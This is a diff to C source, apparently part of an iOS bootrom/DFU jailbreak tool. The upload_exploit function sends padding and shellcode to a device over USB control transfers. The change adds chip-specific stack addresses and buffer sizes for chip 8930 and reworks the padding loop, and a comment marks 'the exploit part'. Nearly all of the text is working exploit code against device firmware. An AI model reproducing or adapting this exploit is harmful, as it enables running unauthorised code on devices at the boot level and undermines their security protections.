@@ -313,7 +313,16 @@ int upload_exploit() {
 	unsigned char shellcode[0x800];
 	unsigned char buf[0x800];
 	unsigned int shellcode_address = 0x84023001;
+	unsigned int load_address = 0x84000000;
 	unsigned int stack_address = 0x84033F98;
+	if (device->chip_id == 8930) {
+		stack_address = 0x8403BF9C;
+	}
+	unsigned int max_size = 0x24000;
+	if (device->chip_id == 8930) {
+		max_size = 0x2C000;
+	}
+
 	unsigned int shellcode_length = sizeof(exploit);
 	memset(shellcode, 0x0, 0x800);
 	memcpy(shellcode, exploit, sizeof(exploit));
@@ -336,8 +345,8 @@ int upload_exploit() {
 
 	printf("sent data to copy: %X\n", irecv_control_transfer(client, 0x21, 1, 0, 0, buf, 0x800, 1000));
 	memset(buf, 0xCC, 0x800);
-	for(i=0;i<0x45;i++) irecv_control_transfer(client, 0x21, 1, 0, 0, buf, 0x800, 1000);
-	printf("padded to 0x84023000\n");
+	for(i=0; i<(max_size - 0x800 * 3); i+=0x800) irecv_control_transfer(client, 0x21, 1, 0, 0, buf, 0x800, 1000);
+	printf("padded to %X\n", (load_address + max_size));
 	printf("sent shellcode: %X has real length %X\n", irecv_control_transfer(client, 0x21, 1, 0, 0, shellcode, 0x800, 1000), shellcode_length);
 	// this is the exploit part
 	memset(buf, 0xBB, 0x800);
